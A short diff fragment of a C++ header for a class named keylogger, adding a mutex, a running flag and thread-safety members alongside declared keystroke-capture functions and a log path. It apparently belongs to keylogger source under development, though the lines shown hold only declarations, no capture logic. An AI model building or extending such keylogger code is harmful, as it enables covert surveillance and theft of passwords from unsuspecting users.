@@ -6,11 +6,14 @@
 #include <random> 
 #include <vector>
 #include <atomic>
+#include <mutex>
 using namespace std;
 class keylogger
 {
     public:
     atomic<bool> keyloggerON=false;
+    atomic<bool> keyloggerRunning=false;
+    std::mutex mtx;
     std::string path;
     void Keylogger();
     bool IsPrintable(int key);
